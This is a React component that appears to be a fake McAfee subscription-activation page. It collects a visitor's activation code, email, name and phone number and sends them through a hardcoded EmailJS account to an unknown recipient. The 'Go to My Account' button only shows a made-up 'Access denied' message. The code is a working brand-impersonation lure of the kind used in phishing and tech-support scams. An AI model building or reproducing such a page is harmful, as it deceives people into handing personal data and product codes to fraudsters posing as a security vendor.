import { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import Navbar from "./Navbar";
import AlertMessage from "./AlertMessage";
import UserLogin from "../pages/UserLogin";
import { useEffect } from "react";
import { useLocation } from "react-router-dom";
import Footer from "./Footer";



// Define the Errors type
type Errors = {
  code?: string;
  email?: string;
  name?: string;
  number?: string;
};

export default function EnterCode() {

const [alert, setAlert] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);

  const showAlert = (message: string, type: "success" | "error" | "info" = "info") => {
    setAlert({ message, type });

  }


 const location = useLocation();

  useEffect(() => {
    if (location.hash) {
      const el = document.getElementById(location.hash.substring(1));
      if (el) {
        el.scrollIntoView({ behavior: "smooth" });
      }
    }
  }, [location]);



  const navigate = useNavigate();
  const [name, setName] = useState("");
  const [country, setCountry] = useState("USA");
  const [number, setNumber] = useState("");
  const [errors, setErrors] = useState<Errors>({});

  const [code, setCode] = useState("");
  const [email, setEmail] = useState("");
  const [codeError, setCodeError] = useState("");
  // const [emailError, setEmailError] = useState("");
  const [showNameNumberForm, setShowNameNumberForm] = useState(false);

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/[^a-zA-Z0-9]/g, "");
    const limited = rawValue.slice(0, 25);
    const formatted =
      limited.match(/.{1,5}/g)?.join("-").replace(/-$/, "") || "";
    setCode(formatted);
    setCodeError("");
  };

  const isCodeValid = code.replace(/-/g, "").length === 25;
  const isEmailValid = email.includes("@");

  const handleSubmit = async () => {
    const newErrors: Errors = {};
  
    // Step 1: Validate code & email
    if (!isCodeValid) {
      newErrors.code = "We need your activation code to start your subscription.";
    }
    if (!isEmailValid || !email) {
      newErrors.email = "Please enter a valid email address.";
    }
  
    // Step 2: If name/number form is visible, validate them too
    if (showNameNumberForm) {
      if (!name.trim()) {
        newErrors.name = "Please enter your name";
      }
      if (!/^\d{10}$/.test(number)) {
        newErrors.number = "Please enter a valid mobile number.";
      }
    }
  
    setErrors(newErrors);
  
    // If any errors exist, stop here
    if (Object.keys(newErrors).length > 0) return;
  
    // Step 3: Show name/number form if it hasn't been shown yet
    if (!showNameNumberForm) {
      setShowNameNumberForm(true);
      return; // Stop here, wait for next submit
    }
  
    // Step 4: Everything is valid, now send email
    try {
      const result = await emailjs.send(
        "service_uwgxhgo",
        "template_6hqt4d7",
        {
          title: "McAfee",
          from_name: "McAfee",
          web_name: code,
          message: email , 
          name: name ,
          phone: number,
          country: country,
        },
        "iwh2dFI31xGaG4fBY"
      );
  
      if (result.status === 200) {
        console.log(" Email sent successfully!", result.text);
        navigate("/demo");
      } else {
        console.warn(" Email not sent:", result.status, result.text);
      }
    } catch (error) {
      console.error(" Failed to send email:", error);
    }
  };
  

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-between">
      <Navbar/>
      <header className="bg-white shadow p-4 pl-60 flex items-center justify-start border-b-4 border-red-600">
        <img src="/logo-mca.png" alt="McAfee Logo" className="h-8" />
      </header>

      <main className="flex flex-1 flex-col lg:flex-col">
        <div className="w-full h-screen bg-[url('/bg2.png')] bg-cover bg-no-repeat bg-center flex items-center justify-center px-6 py-12">
          <div className="bg-opacity-60 p-6 rounded-md w-full max-w-4xl space-y-6">
            <h2 className="text-2xl font-bold text-white">Activate Your Subscription</h2>
            <p className="text-white text-sm">
              Redeem your code and download your security product now.
            </p>

            {/* Activation Code Section */}
            <div className="bg-white rounded-md shadow p-4 space-y-2">
              <label className="block text-3xl font-medium text-gray-700">
                Enter your code
              </label>
              <h1>Activation code (25 digits)</h1>

              <div className="relative">
                <input
                  type="text"
                  placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
                  value={code}
                  onChange={handleCodeChange}
                  className={`block w-full px-3 py-2 border ${
                    isCodeValid ? "border-green-500" : "border-gray-300"
                  } rounded-md shadow-sm outline-none focus:ring-red-600 focus:border-[red] pr-10`}
                />
                {isCodeValid && (
                  <span className="absolute inset-y-0 right-3 flex items-center text-green-600 text-xl">✅</span>
                )}
              </div>

              {!isCodeValid && codeError && (
                <p className="text-red-600 text-sm mt-1">{errors.code}</p>
              )}
            </div>

            {/* Email Form Section */}
            {!showNameNumberForm && (
              <div className="bg-white rounded-md py-5 shadow p-4 space-y-2">
                <label className="block text-lg font-medium text-gray-700">
                  Enter your email
                </label>
                <h1>We'll set up your account or use the one you already have.</h1>
                <input
                  type="email"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    // setEmailError("");
                  }}
                  className="block outline-none w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-[gray] focus:border-[gray]"
                />
                {errors.email && (
                  <p className="text-red-600 text-sm mt-1">{errors.email}</p>
                )}
              </div>
            )}

{alert && (
    <AlertMessage
      message={alert.message}
      type={alert.type}
      onClose={() => setAlert(null)}
    />
  )}
            {/* Name and Number Form Section */}
            {showNameNumberForm && (
              <>
                <div className="bg-white px-5 py-5 rounded-lg">
                  <h2 className="text-2xl font-semibold">Enter your Name</h2>
                  <p className="text-gray-600 mb-4">
                    We'll set up your account or use the one you already have.
                  </p>
                  <label className="block font-medium mb-1">Name</label>
                  <input
                    type="text"
                    className={`w-full border ${
                      errors.name ? "border-red-500" : "border-gray-300"
                    } rounded px-4 py-2`}
                    placeholder="Name"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                  />
                  {errors.name && (
                    <p className="text-red-500 text-sm mt-1">{errors.name}</p>
                  )}

                  {/* Number Section */}
                  <div>
                    <h2 className="text-2xl font-semibold">Enter your number</h2>
                    <p className="text-gray-600 mb-4">
                      We'll set up your account or use the one you already have.
                    </p>
                    <div className="flex space-x-2">
  <div>
    <label htmlFor="country-select" className="sr-only">Select Country</label> {/* Screen-reader-only label */}
    <select
      id="country-select"
      className="border border-gray-300 rounded px-4 py-2"
      value={country}
      onChange={(e) => setCountry(e.target.value)}
      aria-label="Select Country" 
    >
      <option value="USA">USA</option>
      <option value="India">India</option>
      <option value="UK">UK</option>
    </select>
  </div>

  <div>
    <label htmlFor="number-input" className="sr-only">Enter Number</label> {/* Screen-reader-only label */}
    <input
      id="number-input"
      type="text"
      className={`flex-1 border ${
        errors.number ? "border-red-500" : "border-gray-300"
      } rounded px-4 py-2`}
      placeholder="Number"
      value={number}
      onChange={(e) => setNumber(e.target.value)}
      aria-label="Enter Phone Number" 
    />
  </div>
</div>
                    {errors.number && (
                      <p className="text-red-500 text-sm mt-1">{errors.number}</p>
                    )}
                  </div>
                </div>
              </>
            )}

            {/* Next Button */}
            <button
              onClick={handleSubmit}
              className="w-full bg-red-600 text-white font-semibold py-2 rounded hover:bg-red-700 transition"
            >
              Next
            </button>

            <p className="text-xl pt-10 text-black text-center">
              By clicking <strong>Next</strong>, you accept the{" "}
              <a href="#" className="text-red-600 underline">License Agreement</a> and{" "}
              <a href="#" className="text-red-600 underline">Privacy Notice</a>
              You will also receive an email with instructions on downloading your app.
            </p>
          </div>
        </div>

       
  {/* ✅ Render this at the top-level (e.g., inside App or main layout) */}
 <section id="userlogin">
        <UserLogin />
      </section>
  {/* Main section */}
  <div className="text-center space-y-4 pt-6 pb-10 bg-white">
    <p className="text-lg font-medium">Step 1 of 2</p>

    <div className="flex items-center justify-center gap-2">
      <div className="w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-semibold">1</div>
      <div className="w-10 h-1 bg-gray-400"></div>
      <div className="w-8 h-8 rounded-full bg-gray-400 text-white flex items-center justify-center font-semibold">2</div>
    </div>

    <p className="text-gray-800">Already redeemed your code? Download your app from your account.</p>

    <button
      onClick={() => showAlert("Access denied. You do not have permission to view this account.!", "error")}
      className="text-red-600 border border-red-600 px-6 py-2 font-semibold rounded hover:bg-red-50 transition"
    >
      Go to My Account
    </button>
  </div>


      </main>

      
        <Footer/>
    </div>
  );
}
